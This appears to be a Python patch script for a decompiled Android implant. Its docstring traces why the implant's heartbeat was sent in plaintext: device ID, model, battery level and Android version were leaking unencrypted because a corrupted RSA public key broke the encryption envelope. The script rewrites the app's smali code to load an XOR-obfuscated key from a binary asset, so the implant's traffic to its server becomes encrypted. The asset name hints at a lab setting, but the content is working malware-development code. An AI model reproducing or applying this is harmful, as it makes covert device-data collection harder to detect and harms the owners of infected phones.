"""Fix the RSA public-key delivery so sp0.e can actually encrypt.

Root cause (proven from the built DEX, not from apktool's re-serialisation):

    sp0.e() builds the request with

        v=3&d=<aes(payload)>&k=<rsa(aesKey)>&i=<iv>

    and then, at smali/a/sp0.smali lines 2021 and 2025,

        if-eqz v8, :cond_6      # wg1.b() returned null  -> skip the envelope
        if-eqz v4, :cond_6      # wg1.a() returned null  -> skip the envelope
        ...
        :cond_6
        ... POST p0 anyway ...

    So when either crypto step fails, p0 still holds the *plaintext* form and the
    implant posts it in the clear. That is exactly the 684-byte body in the live
    log:

        keys=[Battery,Device_id,Model,action,andver,...] head='action=heartbeat&Model=M'

    wg1.a() ([BLjava/lang/String;) -- the RSA wrapper -- returns null whenever
    KeyFactory.generatePublic() throws, and it throws whenever the Base64 it is
    handed is not a valid X.509 SubjectPublicKeyInfo.

    The Base64 comes from SecurityRuntime.decode(sp0.g.getValue()), i.e. the XOR
    of ky(5) with "VexR_2026". The previous patch put that key into a smali
    const-string as \\uXXXX escapes, but the XOR output contains 0x00 bytes (at
    indices 123, 208 and 305 of the 392-byte blob) and apktool's assembler
    silently mangles \\u0000 -- the built DEX ends up holding a corrupted
    123-byte prefix. SecurityRuntime.decode then yields garbage, the RSA key
    fails to load, wg1.a() returns null, and the implant falls back to plaintext.

Fix: do not put binary data in a smali string literal at all. Ship the
XOR-encoded key as a binary asset (which apktool round-trips byte-for-byte,
NULs and all) and make ky(5) read it.

    python3 -I fix_pubkey2.py <decoded-dir>
"""
from __future__ import annotations

import sys
from pathlib import Path

SALT = b"VexR_2026"
KEY_PATH = Path("smali/a/ky.smali")
ASSET_NAME = "lab_pubkey.bin"
PUBKEY_B64_PATH = Path("server_public.pem.b64")


def xor(data: bytes, key: bytes = SALT) -> bytes:
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))


def main() -> int:
    root = Path(sys.argv[1])
    ky = root / KEY_PATH
    if not ky.exists():
        print(f"[!] not found: {ky}")
        return 1

    b64 = PUBKEY_B64_PATH.read_text().strip().encode()
    obf = xor(b64)
    asset = root / "assets" / ASSET_NAME
    asset.parent.mkdir(parents=True, exist_ok=True)
    asset.write_bytes(obf)
    print(f"[+] wrote {asset} ({len(obf)} bytes, {obf.count(0)} NULs preserved)")

    src = ky.read_text(encoding="utf-8")

    # Replace the whole pswitch_1 branch: read the asset and return its bytes.
    start = src.index("    :pswitch_1\n")
    end = src.index("    :pswitch_2\n", start)
    branch = src[start:end]

    body = (
        f"    :pswitch_1\n"
        f"\n"
        f"    sget-object v0, La/sp0;->a:Landroid/content/Context;\n"
        f"\n"
        f"    if-nez v0, :cond_pk\n"
        f"\n"
        f"    const/4 v0, 0x0\n"
        f"\n"
        f"    return-object v0\n"
        f"\n"
        f"    :cond_pk\n"
        f"    invoke-virtual {{v0}}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;\n"
        f"\n"
        f"    move-result-object v1\n"
        f"\n"
        f"    const-string v2, \"{ASSET_NAME}\"\n"
        f"\n"
        f"    invoke-virtual {{v1, v2}}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;\n"
        f"\n"
        f"    move-result-object v1\n"
        f"\n"
        f"    invoke-virtual {{v1}}, Ljava/io/InputStream;->available()I\n"
        f"\n"
        f"    move-result v2\n"
        f"\n"
        f"    new-array v2, v2, [B\n"
        f"\n"
        f"    invoke-virtual {{v1, v2}}, Ljava/io/InputStream;->read([B)I\n"
        f"\n"
        f"    invoke-virtual {{v1}}, Ljava/io/InputStream;->close()V\n"
        f"\n"
        f"    return-object v2\n"
    )
    src = src[:start] + body + src[end:]
    ky.write_text(src, encoding="utf-8")
    print(f"[+] patched {ky} to read assets/{ASSET_NAME}")

    # Sanity: the round trip through SecurityRuntime.decode must give back the b64
    recovered = xor(obf).decode()
    print(f"[+] round-trip: {recovered[:32]}... matches={recovered == b64.decode()}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
